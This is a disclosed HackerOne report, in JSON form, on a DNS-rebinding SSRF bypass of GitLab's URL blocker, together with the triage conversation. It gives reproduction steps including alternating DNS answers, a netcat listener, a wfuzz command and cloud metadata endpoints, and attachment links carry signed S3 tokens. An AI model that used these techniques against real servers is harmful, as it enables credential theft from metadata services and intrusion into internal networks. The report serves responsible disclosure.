{"id":541169,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NDExNjk=","url":"https://hackerone.com/reports/541169","title":"GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-04-17T09:18:36.964Z","submitted_at":"2019-04-17T09:18:36.964Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ajxchapman","url":"/ajxchapman","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-12T11:56:05.168Z","bug_reporter_agreed_on_going_public_at":"2019-12-11T10:18:56.271Z","team_member_agreed_on_going_public_at":"2019-12-12T11:56:05.010Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Summary\nThe `GitLab::UrlBlocker` IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.\n\n### Details\nThe IP address validation code in `/lib/gitlab/url_blocker.rb` resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (`127.0.0.1`, `::1`, `169.254.0.0/16`, etc.) or returns `true` if the IP address do not match the block lists.\n```ruby\n  begin\n    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|\n      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr\n    end\n  rescue SocketError\n    return true\n  end\n\n  validate_localhost!(addrs_info) unless allow_localhost\n  validate_loopback!(addrs_info) unless allow_localhost\n  validate_local_network!(addrs_info) unless allow_local_network\n  validate_link_local!(addrs_info) unless allow_local_network\n\n  true\nend\n```\nIf the address validates the `GitLab::HTTP` code then uses `HTTParty` to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed. \n\nIn order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in {F470655}. Output of resolving `gitlabextssrf.webhooks.pw` against this DNS resolver configuration is shown below:\n```sh\n$ dig +noall +answer gitlabextssrf.webhooks.pw\ngitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160\n$ dig +noall +answer gitlabextssrf.webhooks.pw\ngitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160\n$ dig +noall +answer gitlabextssrf.webhooks.pw\ngitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1\n$ dig +noall +answer gitlabextssrf.webhooks.pw\ngitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1\n$ dig +noall +answer gitlabextssrf.webhooks.pw\ngitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160\n```\nNotice the alternating resolved IP address and 0 ttl.\n\n### Attack scenario\nUsing the Web Hook integration functionality of a GitLab repository, this issue can be abused to send HTTP GET and POST requests to arbitrary IP addresses, with arbitrary path parameters. The following screenshot shows the response of an HTTP GET request to `http://169.254.169.254/metadata/v1.json` on a DigitalOcean droplet:\n{F470641}\n\n### Steps to reproduce\nTo demonstrate this issue I have configured the domain `gitladextssrf.webhooks.pw` to randomly resolve to either `198.211.125.160` or `127.0.0.1`.\n\n1. Create a new repository\n1. Add a commit to the repository\n1. Create a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.\n  * This may take several attempts due to the random nature of the `gitlabextssrf.webhooks.pw` DNS resolver, if it fails with a `500` error, try again until it is accepted.\n1. Log into the gitlab server and start a TCP listener on port 9999/tcp (e.g. `nc -vvn -l -p 9999`)\n1. Perform numerous parallel requests to the Web Hook test endpoint. For this I use `wfuzz`\n\n```sh\n$ ./wfuzz -X POST \\\n  -b \"_gitlab_session=\u003csession_id\u003e;\" \\\n  -d \"_method=post\u0026authenticity_token=\u003ctoken\u003e\" \\\n  -z range,0-1000 \\\n  \"https://\u003cdomain\u003e/\u003cuser\u003e/\u003crepo\u003e/hooks/\u003chook_id\u003e/test?trigger=push_events\u0026test=FUZZ\"\n```\nThe the below video demonstration of reproducing this issue:\n{F470642}\n\nAfter several requests a connection will be made to the local TCP listener on port 9999/tcp.\n\n### Impact\nThis issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.\n\n### What is the current *bug* behavior?\nThe `GitLab::UrlBlocker` validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the `GitLab::HTTP` module which re-resolves the URL domain in order to perform the HTTP request.\n\n### What is the expected *correct* behavior?\nThe validated resolved addresses should be returned by `GitLab::UrlBlocker` and used by `GitLab::HTTP` to make the TCP connection to the destination host.\n\n### Relevant logs and/or screenshots\nOutput of using the ToCToU bypass in a Web Hook to send a request to the DigitalOcean droplet meta data API `http://169.254.169.254/metadata/v1.json` endpoint:\n{F470641}\n\n### Output of checks\n#### Results of GitLab environment info\n```sh\n$ gitlab-rake gitlab:env:info\n\nSystem information\nSystem:         Ubuntu 18.04\nProxy:          no\nCurrent User:   git\nUsing RVM:      no\nRuby Version:   2.5.3p105\nGem Version:    2.7.6\nBundler Version:1.16.6\nRake Version:   12.3.2\nRedis Version:  3.2.12\nGit Version:    2.18.1\nSidekiq Version:5.2.5\nGo Version:     unknown\n\nGitLab information\nVersion:        11.9.8-ee\nRevision:       c9701808101\nDirectory:      /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter:     postgresql\nDB Version:     9.6.11\nURL:            https://gitlabext.webhooks.pw\nHTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git\nSSH Clone URL:  git@gitlabext.webhooks.pw:some-group/some-project.git\nElasticsearch:  no\nGeo:            no\nUsing LDAP:     no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:        8.7.1\nRepository storage paths:\n- default:      /var/opt/gitlab/git-data/repositories\nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\nGit:            /opt/gitlab/embedded/bin/git\n```\n\nI have confirmed this issue on both the official Docker image and the official `gitlab-ee` Ubuntu package (using installation instructions from https://about.gitlab.com/install/#ubuntu).\n\n## Impact\n\nThis issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.","bounty_amount":"5000.0","formatted_bounty":"$5,000","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":470641,"file_name":"Screenshot_from_2019-04-17_09-18-49.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/470/641/30a1794b8ace50c8dab24743c5eb0336b4e3366f/Screenshot_from_2019-04-17_09-18-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-04-17_09-18-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-04-17_09-18-49.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151006Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6bbb360f2b3536efa8c6ae7581bde15f6018e2f92e349d2866bd3d71a1cd8b5d","file_size":68517,"type":"image/png"},{"id":470642,"file_name":"gitlab_ssrf.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/470/642/b1de89da2206e6799e15728bb745fefa9ae0081e/gitlab_ssrf.mp4?response-content-disposition=attachment%3B%20filename%3D%22gitlab_ssrf.mp4%22%3B%20filename%2A%3DUTF-8%27%27gitlab_ssrf.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151006Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b382139dca4294662921946229ad8c2fc847c8dbd9ca69b109f68c8886d5142b","file_size":3640819,"type":"video/mp4"},{"id":470655,"file_name":"41_gitlab.json","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/470/655/dde8d1548d92ff35d1c94fab303b8ff2492831aa/41_gitlab.json?response-content-disposition=attachment%3B%20filename%3D%2241_gitlab.json%22%3B%20filename%2A%3DUTF-8%27%2741_gitlab.json\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ57JDOB6N%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151006Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJGMEQCIEj%2FvPHmMbBPYj%2BEqI%2BytJ5vP%2BW1Gij3b1KCROLW2m2fAiAUI2BnkECXV9d7hwkeZDEOYP6soFW%2FVQ7MIgaTaOghmSqDBAjw%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMaJpXtlkzQ%2F0YHokTKtcDqr54hfj92oRcu2Uf5AYn5X1dcYZ2fUSGzbf8TlAKPi%2BieszVvrvHI%2FlmbHmgiT1EynvsarNndOfkF2FRqu00jKx0CkmuRzepTozsI%2FVM4zmVsulVco0%2FTcUTH7ncLq5w17UCDOGpnW6JGeAot2EMSfGI%2BXeXow9Po2gINOm1gQnayfBCxU0Glim8HMTLVSft15PsLBhoVz6MQjjs5LpN9XS8yUG%2FvTzXTgclJY%2F9kWPo7VUzvyGgDBwaQ1NS4mY%2FwZ0AT%2BbZ6JXbFSX9ET%2BsjMi2Xi4Iz%2BSZK9IqUkrM05KykgVZmm0Jj83i2n43f%2BohD1oputpWW5Uu1cAXNs%2F4CRB2hvvyPQb%2B2khSXC6sOQi3exb9EuT5FkfOJXRD2w2ObGvWHxM%2BDQNczFHMaUBsCSSNn2cKqA093ghnjQ0g83xgTV9SBPb0QjpItD1Tnt9%2Bri%2FBh8RNCTedm%2Bor7TU6AnBCa6N50D96ANJhWhGw8kKZQdvzW0b0yw%2FH0clJ9XBtHGp1ul88rpA7tUuIoM7z31gr%2FReHR4G0fbpI0Bw%2BzUst%2BenEZyU7QQChxDc0u9loqAHNkWSJ3vDfDAhU2gFvocid02DAX%2FlKRXns4oUAYN7obhQgZX31MK2XkYsGOqYBmhNgLXdsx%2F8OPaK%2FmcpHbqK%2FVdgD3s09C%2FMBcjoeNruPiR%2B0%2FIpdgtcxNhaPoR0zb6re%2ByXh4v3hr2D2Z0%2BZCE4KiobLnf4PqE9a5czy2i5ctMeGIPCspubSRwCRBRORrnkT6%2FEocUc5PNqombEgctkvB80CoCyMfXpFqtIL0ne7x%2B%2B6lVkpXfm14Eb3XaRg7qWG7XL4Ud5U62KMTzbzA3t%2FxnvzsA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=47cbeb1b578269a21367f345fd09f478a311bf454ad961a87321e92141367d07","file_size":285,"type":"text/plain"}],"allow_singular_disclosure_at":null,"vote_count":62,"voters":["sat0shi","th3hidd3nmist","djcater","dee-see","msultan","krevetk0","sourc7","ajxchapman","mashoud1122","zonduu","and 52 more..."],"severity":{"rating":"high","score":7.6,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4582663,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ajxchapman,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2019-04-17T09:21:08.187Z","updated_at":"2019-04-17T09:21:08.187Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":4584361,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi @ajxchapman,\n\ngood finding, thank you for the well-written and thorough report! We recently received a similar report about DNS rebinding in GitLab, which unfortunately makes your report a duplicate. I added you as a participant to the original report.\n\nYou mentioned that it would be possible to access cloud metadata services. Did you find a way to access the GCP metadata endpoint on gitlab.com and obtain the response? Please let us know if you manage to escalate this finding in any way.\n\nBest regards,\nDennis","automated_response":false,"created_at":"2019-04-17T14:28:02.800Z","updated_at":"2019-04-17T14:28:02.800Z","original_report_id":513098,"actor":{"username":"dappelt","cleared":false,"url":"/dappelt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4589167,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the quick response @dappelt. I've not observed any way of getting at the GCP metadata service on gitlab.com at this time, to my understanding that requires a specific HTTP header to be set as well. If I come across any way of accessing this I'll let you know.\n\nThanks","automated_response":false,"created_at":"2019-04-18T07:58:16.021Z","updated_at":"2019-04-18T07:58:16.021Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4590459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The endpoint /v1beta1 does not require the GCP header, i.e. http://metadata.google.internal/computeMetadata/v1beta1\n\nHappy hunting","automated_response":false,"created_at":"2019-04-18T09:33:28.077Z","updated_at":"2019-04-18T09:33:28.077Z","actor":{"username":"dappelt","cleared":false,"url":"/dappelt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4994883,"is_internal":false,"editable":false,"type":"Activities::BugReopened","message":"","automated_response":false,"created_at":"2019-06-04T16:29:34.040Z","updated_at":"2019-06-04T16:29:34.040Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4994927,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @ajxchapman ,\n\nWe want to thank you again for this report. After some internal discussion, we have decided to award you with a $5000 bounty, as your report helped us to recognize that the GCP metadata token was available through this exploit. We built upon your steps to customize the attack to obtain our own tokens on `gitlab.com`. \n\nAs an immediate mitigation, we disabled the legacy GCP endpoint that would allow an attacker to obtain the token without a header. Most recently, we have patched the `GitLab::HTTP` library to use the validated IP address when making connections. This fix went out in GitLab 11.11.1.\n\nPlease let us know if you find that our patch does not mitigate your finding. For now, the issue will stay confidential as we work to address similar issues in other parts of the code base, but it will be made public 30 days after the final fix.\n\nWe look forward to your next report!\n\nBest regards,\nEthan\nSecurity Team | GitLab Inc.\n","automated_response":false,"created_at":"2019-06-04T16:44:06.606Z","updated_at":"2019-06-04T16:44:06.606Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"5000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ajxchapman","url":"/ajxchapman"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4994929,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @ajxchapman ,\n\nI am going to mark this as Resolved, as the issue in `GitLab::UrlBlocker` has been addressed.\n\nThank you again,\nEthan\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2019-06-04T16:45:38.481Z","updated_at":"2019-06-04T16:45:38.481Z","actor":{"username":"estrike","cleared":false,"url":"/estrike","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ajxchapman","url":"/ajxchapman"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5002251,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Team,  thank you for the update and reconsideration of this issue.\n\nMy initial attempts to attempt to access the GCP endpoints failed, I'm really glad you were able to build on this and further secure the GitLab platform.\n\nCheers","automated_response":false,"created_at":"2019-06-05T08:07:11.394Z","updated_at":"2019-06-05T08:07:11.394Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6522069,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi Team, can we disclose this issue?\n\nThanks","automated_response":false,"created_at":"2019-12-11T10:18:56.292Z","updated_at":"2019-12-11T10:18:56.292Z","first_to_agree":true,"actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6530473,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ajxchapman - the attachments of your report might contain sensitive data. For example, the response from the metadata endpoint, IP addresses etc. Do you want to redact these or are you fine with disclosing the report as is?","automated_response":false,"created_at":"2019-12-12T09:46:42.571Z","updated_at":"2019-12-12T09:46:42.571Z","actor":{"username":"dappelt","cleared":false,"url":"/dappelt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6530786,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dappelt, thanks for checking. I have reviewed the report and attachments and am happy for them to be disclosed as is. Thanks!","automated_response":false,"created_at":"2019-12-12T10:41:40.900Z","updated_at":"2019-12-12T10:41:40.900Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6531170,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-12-12T11:56:05.053Z","updated_at":"2019-12-12T11:56:05.053Z","actor":{"username":"dappelt","cleared":false,"url":"/dappelt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6531171,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-12T11:56:05.192Z","updated_at":"2019-12-12T11:56:05.192Z","actor":{"username":"dappelt","cleared":false,"url":"/dappelt","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}